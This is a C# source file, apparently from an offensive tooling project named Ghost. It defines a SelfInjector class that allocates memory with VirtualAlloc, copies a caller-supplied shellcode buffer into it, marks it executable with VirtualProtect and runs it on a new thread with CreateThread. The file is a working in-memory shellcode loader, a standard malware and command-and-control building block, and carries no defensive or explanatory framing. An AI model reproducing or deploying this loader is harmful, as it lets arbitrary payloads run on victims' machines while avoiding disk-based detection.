using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Ghost.Internal
{
    public class SelfInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0, string filePath = null)
        {
            var baseAddress = Native.Kernel32.VirtualAlloc(
                IntPtr.Zero,
                shellcode.Length,
                Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite);

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            Native.Kernel32.VirtualProtect(
                baseAddress, 
                shellcode.Length, 
                Native.Kernel32.MemoryProtection.ExecuteRead, 
                out _);

            Native.Kernel32.CreateThread(
                IntPtr.Zero,
                0,
                baseAddress,
                IntPtr.Zero,
                0,
                out var threadId);

            return threadId != IntPtr.Zero;
        }
    }
}
